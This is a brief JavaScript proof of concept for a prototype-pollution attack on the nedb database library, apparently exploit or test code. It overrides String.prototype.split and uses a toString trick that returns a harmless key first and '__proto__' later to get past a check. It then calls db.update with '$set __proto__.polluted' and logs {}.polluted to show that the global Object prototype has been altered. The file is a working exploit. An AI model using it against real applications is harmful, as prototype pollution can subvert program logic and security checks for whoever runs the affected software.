var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const Datastore = require('nedb');
const db = new Datastore();
console.log({}.polluted);
db.insert({ hello: 'world' }, err => {
    db.update({ hello: 'world' }, { $set: { '__proto__.polluted': 'yes' } }, {}, err => {
        console.log({}.polluted);
    });
});